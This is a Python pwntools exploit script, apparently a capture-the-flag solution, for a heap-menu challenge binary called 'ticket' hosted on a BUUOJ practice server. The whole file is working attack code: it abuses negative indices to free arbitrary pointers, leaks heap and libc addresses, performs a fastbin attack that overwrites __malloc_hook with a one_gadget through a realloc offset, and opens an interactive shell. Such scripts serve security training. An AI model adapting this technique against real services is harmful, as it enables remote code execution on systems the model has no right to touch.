# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
context.log_level = 'debug'

binary = 'ticket'
elf = ELF(binary)
libc = ELF("./libc-2.23.so")
context.binary = binary

DEBUG = 0
if DEBUG:
  p = process(binary)
  #p = process(["qemu-aarch64","-L","",binary])
  #p = process(["qemu-aarch64","-L","",-g,"1234",binary])
else:
  host = "node3.buuoj.cn"
  port =  29266
  p = remote(host,port)

l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
sla = lambda a,b  :p.sendlineafter(str(a),str(b))
sa  = lambda a,b  :p.sendafter(str(a),str(b))
lg  = lambda name,data : p.success(name + ": 0x%x" % data)
se  = lambda payload: p.send(payload)
rl  = lambda      : p.recv()
sl  = lambda payload: p.sendline(payload)
ru  = lambda a     :p.recvuntil(str(a))

def dbg():
  gdb.attach(p)
  pause()

def cmd(num):
  sla(">>",num)

def add(id,size):
  cmd(1)
  sla("Index:",id)
  sla("size:",size)

def delete(id):
  cmd(2)
  sla("Index:",id)

def edit(id,text):
  cmd(3)
  sla("Index:",id)
  sla("remarks:",text)

def show(id):
  cmd(4)
  sla("Index:",id)

def show_info():
  cmd(6)

def info(addr):
  sa("Your name:","a"*0x20)
  sa("take off(wu hu qi fei): ","a"*0x20)
  sla("Your age: ",addr)

one_gad = [0x45216,0x4526a,0xf02a4,0xf1147]

info(1)
cmd(5)
info(1)

add(4,0x100)
add(5,0x100)

delete(-2)
delete(-1)

show_info()

p.recvuntil("Saying: ")

heap_addr =  u64(p.recvuntil("\x0a")[0:-1].ljust(8,"\x00"))
lg("leak",heap_addr)

add(0,0x28)
add(1,0x28)

add(2,0x118)
add(3,0x118)
delete(2)
add(2,0x28)
show(2)

__malloc_hook = l64() - 360 - 16
lg("__malloc_hook",__malloc_hook)

libc_base = __malloc_hook - libc.sym["__malloc_hook"]
realloc = libc.sym["realloc"] + libc_base
one_gadget = libc_base + one_gad[0]

lg("realloc",realloc)
lg("libc_base",libc_base)

delete(2)
delete(-10)

add(2,0x60)

cmd(5)
info(heap_addr+0x2b0+0x10)

delete(-3)

edit(2 ,p64(__malloc_hook - 0x23))

delete(0)
delete(1)

add(0,0x68)
add(1,0x68)

payload = "a"*0xb + p64(one_gad[1] + libc_base) + p64(realloc +6)

edit(1, payload)

#dbg()

delete(-10)
cmd(5)


p.interactive()